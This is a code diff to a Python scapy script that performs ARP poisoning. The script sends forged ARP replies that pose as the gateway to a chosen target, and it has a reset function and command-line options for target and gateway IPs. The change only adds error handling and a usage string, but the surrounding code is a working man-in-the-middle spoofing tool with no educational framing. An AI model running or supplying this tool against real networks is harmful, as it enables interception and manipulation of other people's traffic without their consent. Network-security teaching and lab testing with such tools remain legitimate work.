@@ -12,16 +12,18 @@ def get_mac_address(ip):
     return answered_list[0][1].hwsrc
 
 def arp_poisoning(target_ip, gateway_ip):
+    try:
+        target_mac = get_mac_address(target_ip)
 
-    target_mac = get_mac_address(target_ip)
+        # op = 2 stands for responses (request if 1), pdst is target's ip, psrc is modem's ip
+        arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
 
-    # op = 2 stands for responses (request if 1), pdst is target's ip, psrc is modem's ip
-    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+        #scapy.send(arp_response, verbose=False)
 
-    #scapy.send(arp_response, verbose=False)
-
-    ethernet_frame = scapy.Ether(dst=target_mac) / arp_response
-    scapy.sendp(ethernet_frame, verbose=False, count=6)
+        ethernet_frame = scapy.Ether(dst=target_mac) / arp_response
+        scapy.sendp(ethernet_frame, verbose=False, count=6)
+    except IndexError:
+        exit(1)
 
 def reset_operation(target_ip, gateway_ip):
 
@@ -37,7 +39,8 @@ def reset_operation(target_ip, gateway_ip):
     scapy.sendp(ethernet_frame, verbose=False, count=6)
 
 def get_user_input():
-    parse_object = optparse.OptionParser()
+    parse_object = optparse.OptionParser(usage="%prog [options]")
+
 
     parse_object.add_option("-t", "--target", dest="target_ip", help="Target IP")
     parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
